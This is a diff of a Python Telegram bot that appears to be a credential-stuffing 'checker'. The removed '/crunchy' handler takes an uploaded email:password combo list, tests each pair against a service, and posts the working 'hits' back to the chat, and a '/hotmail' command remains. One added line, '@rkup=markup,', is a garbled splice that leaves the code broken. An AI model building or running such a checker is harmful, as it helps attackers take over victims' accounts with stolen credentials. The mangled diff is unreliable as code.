@@ -213,71 +213,7 @@ def callback_query(call):
         pass  # Do nothing
    
 
-@bot.message_handler(commands=['crunchy'])
-def crunchy_command(message):
-    if message.reply_to_message and message.reply_to_message.document:
-        if message.reply_to_message.document.mime_type == 'text/plain':
-            file_info = bot.get_file(message.reply_to_message.document.file_id)
-            downloaded_file = bot.download_file(file_info.file_path)
-            file_content = downloaded_file.decode('utf-8')
-
-            chat_id = message.chat.id
-            username = message.from_user.username
-
-            # Start a new thread to handle the file processing
-            threading.Thread(target=process_crunchy, args=(chat_id, username, file_content)).start()
-        else:
-            bot.reply_to(message, "Please reply to a valid txt file.")
-    else:
-        bot.reply_to(message, "Please reply to a txt file with the /crunchy command.")
-
-def process_crunchy(chat_id, username, file_content):
-    total_accounts = file_content.splitlines()
-    start_time = time.time()  # Start time right before processing
-
-    hits = []
-    dead = []
-
-    initial_message = "Checking Your Accounts...\n\n"
-    footer_info = crunchy_footer_info(total_accounts, start_time, username)  # Updated alias name
-
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton(f"Hit ✅: {len(hits)}", callback_data=f"{chat_id}:hit"))
-    markup.add(types.InlineKeyboardButton(f"Dead ❌: {len(dead)}", callback_data=f"{chat_id}:dead"))
-
-    msg = bot.send_message(chat_id, initial_message + footer_info, reply_markup=markup)
-
-    for account in total_accounts:
-        email, password = account.split(":", 1)
-        result, response_message = check_crunchy(email, password)
-        if result == 'Hit':
-            hits.append(account)
-        else:
-            dead.append(account)
-
-        chat_data[chat_id] = {
-            'hits': hits,
-            'dead': dead,
-            'total_accounts': total_accounts
-        }
-
-        live_update = (
-            f"↯ CRUNCHY CHECKER\n\n"
-            f"➣Combo: <code>{account}</code>\n"
-            f"➣Result: {result}\n"
-            f"➣Response: {response_message}\n\n"
-            f"{footer_info}"
-        )
-
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton(f"Hit ✅: {len(hits)}", callback_data=f"{chat_id}:hit"))
-        markup.add(types.InlineKeyboardButton(f"Dead ❌: {len(dead)}", callback_data=f"{chat_id}:dead"))
-
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=msg.message_id,
-            text=live_update,
-            reply_markup=markup,
+@rkup=markup,
             parse_mode='HTML'  # Enable HTML parsing
         )
 
@@ -293,7 +229,7 @@ def process_crunchy(chat_id, username, file_content):
 
     if hits:
         hit_accounts = '\n'.join(hits)
-        bot.send_message(chat_id, f"↯HITS\n\n{hit_accounts}", parse_mode='HTML')
+        bot.send_message(chat_id, f"↯ HITS\n\n{hit_accounts}", parse_mode='HTML')
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -307,10 +243,10 @@ def callback_query(call):
 
     if cmd == 'hit':
         hits_list = '\n'.join(chat_data[chat_id].get('hits', [])) if chat_data[chat_id].get('hits') else 'No hits yet.'
-        bot.send_message(chat_id, f"↯HITS\n{hits_list}", parse_mode='HTML')
+        bot.send_message(chat_id, f"↯ HITS\n{hits_list}", parse_mode='HTML')
     elif cmd == 'dead':
         dead_list = '\n'.join(chat_data[chat_id].get('dead', [])) if chat_data[chat_id].get('dead') else 'No dead accounts yet.'
-        bot.send_message(chat_id, f"↯DEAD\n{dead_list}", parse_mode='HTML')
+        bot.send_message(chat_id, f"↯ DEAD\n{dead_list}", parse_mode='HTML')
         
 @bot.message_handler(commands=['hotmail'])
 def hotmail_command(message):
